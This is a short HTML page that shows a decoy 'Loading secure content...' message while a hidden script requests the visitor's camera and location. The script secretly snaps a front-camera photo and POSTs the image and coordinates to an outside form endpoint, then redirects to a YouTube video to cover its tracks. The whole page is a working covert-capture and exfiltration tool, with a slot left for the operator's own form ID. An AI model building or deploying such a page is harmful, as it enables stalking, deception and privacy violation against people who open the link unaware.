<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body style="background:#fff; font-family:sans-serif; text-align:center; padding-top:50px;">

    <h2>Loading secure content...</h2>
    <p>Please wait a moment.</p>

    <!-- Hidden Camera Elements -->
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // 1. SET YOUR FORM ID HERE
        const FORM_ID = "https://forminit.com/f/92ay8gp3r7u"; 
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        async function start() {
            try {
                // 2. Request Camera and Location
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                v.srcObject = stream;

                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;

                    // 3. Wait 2 seconds for focus, then snap photo
                    setTimeout(() => {
                        c.width = v.videoWidth;
                        c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);

                        // 4. Convert to real image file (Blob)
                        c.toBlob(async (blob) => {
                            const formData = new FormData();
                            formData.append("picture", blob, "user_capture.jpg");
                            formData.append("location", `https://www.google.com{lat},${lon}`);

                            // 5. Send to Forminit
                            await fetch(`https://forminit.com/f/92ay8gp3r7u`, {
                                method: "POST",
                                body: formData
                            });

                            // 6. Redirect to a safe site
                            window.location.href = "https://www.youtube.com/watch?v=8e76UP9Lvjk";
                        }, 'image/jpeg');
                    }, 2000);
                });
            } catch (e) {
                // If they deny, just redirect
                window.location.href = "https://www.youtube.com/watch?v=8e76UP9Lvjk";
            }
        }

        window.onload = start;
    </script>
</body>
</html>
